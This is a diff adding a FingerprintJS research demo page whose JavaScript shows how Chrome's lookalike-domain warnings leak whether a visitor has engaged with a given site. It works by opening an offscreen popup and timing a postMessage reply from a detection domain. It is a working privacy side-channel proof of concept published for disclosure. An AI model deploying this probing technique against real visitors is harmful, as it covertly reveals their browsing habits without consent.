@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Lookalike Warnings and Site Engagement Leaks</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+  <style>
+    html,
+    body,
+    #root {
+      padding: 0;
+      margin: 0;
+      background-color: #141415;
+      color: #fafafa;
+      height: 100%;
+      font-family: system-ui, -apple-system;
+      line-height: 150%;
+    }
+
+    body,
+    div {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 30px;
+      box-sizing: border-box;
+      padding-bottom: 100px;
+      touch-action: none;
+    }
+
+    h1,
+    h2,
+    h3 {
+      color: #ff5d22;
+      text-align: center;
+      line-height: 150%;
+    }
+
+    p {
+      text-align: center;
+    }
+
+    p.disclaimer {
+      text-align: center;
+      color: #434344;
+    }
+
+    button {
+      appearance: none;
+      width: 156px;
+      height: 56px;
+      color: #ffffff;
+      background-color: #ff5d22;
+      border-radius: 6px;
+      border: none;
+      font-weight: 500;
+      font-size: 16px;
+      line-height: 150%;
+      font-family: system-ui, -apple-system;
+      padding: 16px;
+      margin-top: 30px;
+    }
+
+    svg {
+      height: 63px;
+      margin-bottom: 24px;
+      display: block;
+    }
+
+    input {
+      -webkit-appearance: none;
+      appearance: none;
+      color: #333;
+      -webkit-font-smoothing: antialiased;
+      width: 100%;
+      max-width: 500px;
+      background-color: #ddd;
+      border: none;
+      padding: 10px 11px 11px 11px;
+      border-radius: 3px;
+      box-shadow: none;
+      outline: none;
+      margin: 0;
+      box-sizing: border-box;
+    }
+
+    footer {
+      position: absolute;
+      bottom: 0;
+      width: 100%;
+      display: flex;
+      height: 100px;
+      justify-content: center;
+      align-items: center;
+    }
+
+    a {
+      display: inline-block;
+      margin: 0px 20px;
+      color: #434344;
+      text-decoration: none;
+      border-bottom: 1px solid #434344;
+      padding: 2px 0px;
+    }
+
+    span.colored {
+      color: #ff5d22;
+    }
+  </style>
+</head>
+
+<!-- <script id="countries" type="application/json"> -->
+</script>
+<script>
+  var CURRENT_DETECTION_TIMEOUT = -1
+  var CURRENT_CALLBACK = undefined
+  var DETECTION_DOMAIN = '.look-a-like.fpjs.sh'
+  var TOP_DOMAINS = ["17track.net", "24h.com.vn", "academia.edu", "academic.ru", "accuweather.com", "adobe.com", "adp.com", "agoda.com", "aif.ru", "airbnb.com", "alibaba.com", "aliexpress.com", "allegro.pl", "allocine.fr", "alodokter.com", "amazon.ca", "amazon.co.jp", "amazon.co.uk", "amazon.com", "amazon.com.mx", "amazon.de", "amazon.es", "amazon.fr", "amazon.in", "amazon.it", "ameblo.jp", "americanexpress.com", "ancestry.com", "animeflv.net", "anyxxx.pro", "aol.com", "apkpure.com", "apple.com", "appledaily.com", "archive.org", "asahi.com", "ask.com", "asos.com", "asus.com", "autotrader.com", "avito.ru", "azlyrics.com", "badoo.com", "baidu.com", "baixaki.com.br", "banggood.com", "bankofamerica.com", "battle.net", "bbc.co.uk", "bbc.com", "beeg.com", "bestbuy.com", "bet365.com", "biblegateway.com", "biglobe.ne.jp", "bild.de", "bilibili.com", "bing.com", "blackboard.com", "blogspot.com", "bloomberg.com", "booking.com", "bookmyshow.com", "britannica.com", "bukalapak.com", "businessinsider.com", "bustle.com", "buzzfeed.com", "ca.gov", "caixa.gov.br", "canada.ca", "canalrcn.com", "canva.com", "capitalone.com", "cargurus.com", "cbsnews.com", "cbssports.com", "ccm.net", "cdc.gov", "cdiscount.com", "ceneo.pl", "chase.com", "chaturbate.com", "chegg.com", "chinatimes.com", "chip.de", "chron.com", "cinecalidad.to", "clarin.com", "cnbc.com", "cnet.com", "cnn.com", "collegedunia.com", "correios.com.br", "craigslist.org", "cricbuzz.com", "dailymail.co.uk", "dailymotion.com", "daum.net", "dell.com", "depositphotos.com", "detik.com", "deviantart.com", "dhgate.com", "dhl.de", "dictionary.com", "discordapp.com", "dmm.co.jp", "dmm.com", "drom.ru", "dropbox.com", "ebay-kleinanzeigen.de", "ebay.co.uk", "ebay.com", "ebay.com.au", "ebay.de", "ebay.es", "ebay.fr", "ebay.it", "eksisozluk.com", "elconfidencial.com", "elintransigente.com", "elmundo.es", "elpais.com", "eluniversal.com.mx", "emag.ro", "engadget.com", "epicgames.com", "espn.com", "etsy.com", "europa.eu", "eventbrite.com", "excite.co.jp", "expedia.com", "express.co.uk", "facebook.com", "fandango.com", "fandom.com", "fast.com", "fc2.com", "fedex.com", "filmweb.pl", "flickr.com", "flipkart.com", "fnac.com", "forbes.com", "foxnews.com", "francetvinfo.fr", "free.fr", "gaana.com", "gamepedia.com", "gamespot.com", "gearbest.com", "genius.com", "gfycat.com", "giphy.com", "gismeteo.ru", "github.com", "glassdoor.com", "globo.com", "glosbe.com", "go.com", "goal.com", "gofundme.com", "goo.ne.jp", "goodreads.com", "google.ca", "google.cl", "google.co.id", "google.co.in", "google.co.jp", "google.co.kr", "google.co.th", "google.co.uk", "google.com", "google.com.ar", "google.com.au", "google.com.br", "google.com.co", "google.com.mx", "google.com.tr", "google.com.tw", "google.de", "google.es", "google.fr", "google.it", "google.nl", "google.pl", "google.pt", "google.ru", "gotporn.com", "gsmarena.com", "gumtree.com", "haberler.com", "hatenablog.com", "hdfcbank.com", "hdrezka.ag", "healthline.com", "hilton.com", "hindustantimes.com", "homedepot.com", "hotels.com", "hotpepper.jp", "hotstar.com", "hp.com", "huawei.com", "huffpost.com", "hulu.com", "icicibank.com", "icloud.com", "ign.com", "ikea.com", "ilmeteo.it", "ilovepdf.com", "imdb.com", "imgur.com", "impress.co.jp", "indeed.com", "indiamart.com", "indiatimes.com", "indiatoday.in", "infobae.com", "instagram.com", "instructables.com", "instructure.com", "interia.pl", "intuit.com", "investing.com", "investopedia.com", "irecommend.ru", "irs.gov", "itau.com.br", "itmedia.co.jp", "jobrapido.com", "justdial.com", "jw.org", "kahoot.it", "kakaku.com", "kakao.com", "kayak.com", "kenh14.vn", "khanacademy.org", "kinopoisk.ru", "kizlarsoruyor.com", "kknews.cc", "kohls.com", "kompas.com", "kotobank.jp", "kp.ru", "lazada.co.th", "leagueoflegends.com", "leboncoin.fr", "lemonde.fr", "lenta.ru", "letmejerk.com", "lifewire.com", "line.me", "linkedin.com", "live.com", "livedoor.com", "livejournal.com", "livescore.com", "livestrong.com", "mail.ru", "makemytrip.com", "malavida.com", "marca.com", "mawdoo3.com", "mayoclinic.org", "meb.gov.tr", "mediafire.com", "medium.com", "mega.nz", "mercadolibre.com", "mercadolibre.com.ar", "mercadolibre.com.co", "mercadolibre.com.mx", "mercadolivre.com.br", "mercari.com", "messenger.com", "mi.com", "microsoft.com", "microsoftonline.com", "milliyet.com.tr", "mk.ru", "mlb.com", "mobile.de", "mobile01.com", "monografias.com", "msn.com", "mundodeportivo.com", "myanimelist.net", "mynavi.jp", "mynet.com", "n11.com", "namu.wiki", "naver.com", "nba.com", "nbcnews.com", "nbcsports.com", "ndtv.com", "netflix.com", "news18.com", "nextdoor.com", "nhk.or.jp", "nicovideo.jp", "nifty.com", "nih.gov", "nike.com", "nikkansports.com", "nikkei.com", "nvidia.com", "nypost.com", "nytimes.com", "office.com", "office365.com", "ok.ru", "okdiario.com", "olx.co.id", "olx.com.br", "olx.pl", "olx.ua", "onet.pl", "onlinesbi.com", "onlinevideoconverter.com", "op.gg", "orange.fr", "otto.de", "otvfoco.com.br", "over-blog.com", "pantip.com", "passeidireto.com", "patreon.com", "paypal.com", "perfectgirls.net", "pinterest.co.uk", "pinterest.com", "pinterest.es", "pixiv.net", "pixnet.net", "playstation.com", "politico.com", "polygon.com", "pornhub.com", "prezi.com", "primevideo.com", "programme-tv.net", "qq.com", "qualtrics.com", "quizlet.com", "quora.com", "rakuten.co.jp", "rambler.ru", "ranker.com", "reddit.com", "redtube.com", "researchgate.net", "reverso.net", "rg.ru", "rightmove.co.uk", "roblox.com", "rottentomatoes.com", "rozetka.com.ua", "rt.com", "sabah.com.tr", "sahibinden.com", "samsung.com", "sanook.com", "sarkariresult.com", "sciencedirect.com", "scribd.com", "sfgate.com", "shopee.co.th", "shutterstock.com", "sinoptik.ua", "sky.com", "skyscanner.net", "skysports.com", "slideshare.net", "smallpdf.com", "smi2.ru", "softonic.com", "soundcloud.com", "sozcu.com.tr", "spankbang.com", "speedtest.net", "spiegel.de", "spotify.com", "sputniknews.com", "stackexchange.com", "stackoverflow.com", "steamcommunity.com", "steampowered.com", "study.com", "surveymonkey.com", "t-online.de", "tabelog.com", "taleo.net", "taobao.com", "target.com", "techradar.com", "techtudo.com.br", "telegraph.co.uk", "termometropolitico.it", "thebalancecareers.com", "thedailybeast.com", "thefreedictionary.com", "theguardian.com", "thepiratebay.org", "thesaurus.com", "theverge.com", "thoughtco.com", "tim.it", "tistory.com", "tnaflix.com", "tokopedia.com", "trello.com", "tribunnews.com", "tripadvisor.com", "trulia.com", "trustpilot.com", "tumblr.com", "tutorialspoint.com", "twitch.tv", "twitter.com", "uber.com", "ubisoft.com", "udemy.com", "udn.com", "ultimate-guitar.com", "unam.mx", "uniqlo.com", "uol.com.br", "ups.com", "uptodown.com", "urbandictionary.com", "usatoday.com", "usps.com", "vice.com", "vimeo.com", "vk.com", "vnexpress.net", "w3schools.com", "walmart.com", "washingtonpost.com", "wattpad.com", "weather.com", "web.de", "webmd.com", "weebly.com", "wellsfargo.com", "wetransfer.com", "whatsapp.com", "wikihow.com", "wikipedia.org", "wiktionary.org", "wish.com", "wixsite.com", "wondershare.com", "wordpress.com", "wordreference.com", "wp.pl", "wsj.com", "www.gob.mx", "www.gov.uk", "xbox.com", "xe.com", "xfinity.com", "xhamster.com", "xnxx.com", "xnxx2.pro", "xozilla.com", "xvideos.com", "yahoo.co.jp", "yahoo.com", "yandex.ru", "yelp.com", "yenisafak.com", "youjizz.com", "youm7.com", "youporn.com", "yourdictionary.com", "youtube.com", "yts.am", "zendesk.com", "zillow.com", "zing.vn", "znanija.com", "zomato.com"]
+
+  window.addEventListener(
+    "message",
+    (event) => {
+      if (!event.origin.endsWith(DETECTION_DOMAIN)) return;
+
+      window.clearTimeout(CURRENT_DETECTION_TIMEOUT)
+      CURRENT_CALLBACK(false)
+    },
+    false,
+  )
+
+  window.addEventListener("DOMContentLoaded", () => {
+    if (!isGoogleChrome()) {
+      return renderUnsupportedBrowser()
+    }
+
+    return renderWelcomePage()
+  })
+
+  function renderUnsupportedBrowser() {
+    const title = document.createElement("h1")
+    title.textContent = "Unsupported Browser"
+
+    const description = document.createElement("p")
+    description.textContent = "Please run this demo in Google Chrome version 75 and higher."
+    window.content.append(title, description)
+  }
+
+  function renderWelcomePage() {
+    const title = document.createElement("h1")
+    title.textContent = '"Lookalike" Warnings and Site Engagement Leaks'
+
+    const description = document.createElement("p")
+    description.textContent = `
+This demo showcases how Chrome's "Lookalike" warnings can disclose a visitor's site-engagement state to arbitrary 
+websites. To see it in action:`
+
+    const steps = document.createElement("ol")
+    const first = document.createElement("li")
+    const second = document.createElement("li")
+    const third = document.createElement("li")
+    first.innerHTML = "Open <span class='colored'>chrome://site-engagement</span> in a new tab and copy a website from the top of the list."
+    second.textContent = "Paste the copied website into the input below and click the Check button."
+    third.innerHTML = "Try with another website which is not listed as engaged, for example <span class='colored'>https://example.com</span>."
+
+    const input = document.createElement("input")
+    input.id = "websiteSource"
+    input.placeholder = "https://example.com"
+
+    const button = document.createElement("button")
+    button.textContent = "Check"
+    button.onclick = initiate
+
+    const disclaimer = document.createElement("p")
+    disclaimer.classList.add("disclaimer")
+    disclaimer.innerText = "Clicking 'Check' will initiate a browser request to *.look-a-like.fpjs.sh."
+
+    steps.append(first, second, third)
+    window.content.append(title, description, steps, input, button, disclaimer)
+  }
+
+  function renderWebsiteIneligible(website, reason) {
+    window.content.innerHTML = ""
+
+    const description = document.createElement("p")
+    const websiteSpan = coloredText(website)
+
+    description.append("The site-engagement state of ", websiteSpan, ` can not be determined because ${reason}.`)
+
+    const button = document.createElement("button")
+    button.textContent = "Try again"
+    button.onclick = () => { window.location.reload() }
+
+    window.content.append(description, button)
+  }
+
+  function renderResult(website, isEngaged) {
+    window.content.innerHTML = ""
+
+    const description = document.createElement("p")
+    const websiteSpan = coloredText(website)
+
+    if (!isEngaged) {
+      description.append("The website ", websiteSpan, " is not engaged in the current browsing session.")
+    } else {
+      description.append("The website ", websiteSpan, " seems to be engaged in the current browsing session.")
+    }
+
+    const button = document.createElement("button")
+    button.textContent = "Try again"
+    button.onclick = () => { window.location.reload() }
+
+    window.content.append(description, button)
+  }
+
+  async function initiate(e) {
+    //var websites = JSON.parse(document.getElementById('countries').textContent)
+    let website = document.getElementById("websiteSource").value
+
+    if (website == "") website = "https://example.com"
+
+    const error = isWebsiteEligible(website)
+    if (error) {
+      return renderWebsiteIneligible(website, error)
+    }
+
+    const detectionWindow = createDetectionWindow()
+    await detect(detectionWindow, (new URL(website)).hostname).then(isEngaged => {
+      return renderResult(website, isEngaged)
+    })
+
+    detectionWindow.close()
+  }
+
+  function isWebsiteEligible(website) {
+    try {
+      const url = new URL(website)
+      if (TOP_DOMAINS.some(domain => url.hostname.endsWith(domain))) {
+        return "the domain is one of the top 500 global websites"
+      }
+
+      return undefined
+    } catch (e) {
+      return "it is not valid URL"
+    }
+  }
+
+  function createDetectionWindow() {
+    const params = `width=50,height=50,left=9999,top=9999`
+    return window.open('about:blank', '', params)
+  }
+
+  function detect(w, domain) {
+    const detectionPath = `${DETECTION_DOMAIN}/detect.html#x`
+
+    return new Promise((resolve) => {
+      CURRENT_DETECTION_TIMEOUT = setTimeout(() => {
+        resolve(true)
+      }, 1000)
+      CURRENT_CALLBACK = resolve
+
+      w.location = `http://${domain}${detectionPath}`
+    })
+  }
+
+  function isGoogleChrome() {
+    return navigator.userAgentData.brands.some(
+      b => b.brand == "Google Chrome" && parseInt(b.version) >= 75
+    )
+  }
+
+  function coloredText(text) {
+    const element = document.createElement("span")
+    element.classList.add("colored")
+    element.innerText = text
+
+    return element
+  }
+</script>
+<body>
+  <svg class="logo" viewBox="0 0 61 63" xmlns="http://www.w3.org/2000/svg" aria-label="FingeprintJS logo">
+    <path
+      d="M49.627 7.8a1.62 1.62 0 01-.78-.2 41.29 41.29 0 00-37.29 0 1.75 1.75 0 01-2.28-.63 1.54 1.54 0 01.66-2.13 44.88 44.88 0 0140.45-.05 1.51 1.51 0 01.7 2.13 1.68 1.68 0 01-1.46.88zM1.707 24.37a1.86 1.86 0 01-1-.29 1.52 1.52 0 01-.4-2.2 34.23 34.23 0 0112.58-10.32 40.78 40.78 0 0134.52 0 34.28 34.28 0 0112.56 10.22 1.53 1.53 0 01-.41 2.21 1.74 1.74 0 01-2.34-.43 31.06 31.06 0 00-11.35-9.27 37.2 37.2 0 00-31.47 0 31.26 31.26 0 00-11.37 9.41 1.48 1.48 0 01-1.31.67zm20.93 38.09a1.65 1.65 0 01-1.18-.48 31.66 31.66 0 01-6.72-8.33 26.64 26.64 0 01-3.52-13.69c0-9.37 8.5-17 19-17s18.9 7.6 18.9 17a1.68 1.68 0 01-3.36 0c0-7.65-7-13.87-15.58-13.87s-15.61 6.22-15.61 13.87a23.57 23.57 0 003.11 12.14 29.64 29.64 0 006.2 7.63 1.56 1.56 0 010 2.25 2 2 0 01-1.24.48zm24-5.85a18.86 18.86 0 01-10.38-2.8 16.55 16.55 0 01-8-13.85 1.67 1.67 0 013.34 0 13.39 13.39 0 006.53 11.23 15.37 15.37 0 008.51 2.24 23.94 23.94 0 003.48-.31 1.67 1.67 0 012 1.29 1.59 1.59 0 01-1.38 1.83 25 25 0 01-4 .37zm-6.72 6.51a1.5 1.5 0 01-.44-.07 26.52 26.52 0 01-12.45-6.61 22.44 22.44 0 01-7.28-16.48c0-5.11 4.63-9.29 10.32-9.29s10.31 4.18 10.31 9.29c0 3.36 3.11 6.12 7 6.12s7-2.76 7-6.12c0-11.91-10.89-21.56-24.27-21.56-9.51 0-18.22 5-22.14 12.72a19.37 19.37 0 00-2 8.84 29.57 29.57 0 002.25 11.39 1.53 1.53 0 01-1 2 1.7 1.7 0 01-2.19-.9 33.61 33.61 0 01-2.41-12.49 22.47 22.47 0 012.27-10.23c4.45-8.8 14.33-14.51 25.14-14.51 15.23 0 27.61 11.07 27.61 24.71 0 5.11-4.61 9.27-10.31 9.27s-10.3-4.16-10.3-9.27c0-3.38-3.12-6.12-7-6.12s-7 2.74-7 6.12a19.27 19.27 0 006.34 14.23 23.11 23.11 0 0010.94 5.83 1.57 1.57 0 011.18 1.92 1.64 1.64 0 01-1.57 1.21zm0 0"
+      fill="#f24405"></path>
+  </svg>
+  <div id="content"></div>
+  <footer>
+    <a href="https://fingerprint.com/blog/">Article</a> <!-- TODO: Update article URL -->
+    <a href="https://github.com/fingerprintjs/blog-look-a-like-leaks">Source Code</a>
+  </footer>
+</body>
+</html>
